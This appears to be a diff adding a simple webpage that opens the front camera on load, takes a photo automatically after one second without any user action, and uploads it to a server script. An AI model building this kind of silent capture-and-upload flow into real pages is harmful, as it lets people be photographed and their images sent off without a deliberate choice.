@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Photo Uploader</title>
+</head>
+<body>
+<h1>Front Camera Photo Uploader</h1>
+<video id="videoElement" style="width:300px; height:300px; border:2px solid red;"></video>
+
+<script>
+window.onload = function() {
+  var video = document.getElementById('videoElement');
+
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+    .then(function(stream) {
+      alert(stream);
+      video.srcObject = stream;
+      video.play();
+      setTimeout(function() {
+        takePhoto();
+      }, 1000); // Capture photo 1 second after window loads
+    })
+    .catch(function(err) {
+      alert('Error accessing camera: ' + err);
+    });
+}
+
+function takePhoto() {
+  var video = document.getElementById('videoElement');
+  var canvas = document.createElement('canvas');
+  var context = canvas.getContext('2d');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+  var imageDataURL = canvas.toDataURL('image/jpeg');
+
+  uploadPhoto(imageDataURL);
+}
+
+function uploadPhoto(imageDataURL) {
+  var formData = new FormData();
+  formData.append('photo', imageDataURL);
+
+  fetch('upload.php', {
+    method: 'POST',
+    body: formData
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Upload failed');
+    }
+    console.log('Photo uploaded successfully');
+  })
+  .catch(error => {
+    console.error('Error uploading photo: ', error);
+  });
+}
+</script>
+</body>
+</html>
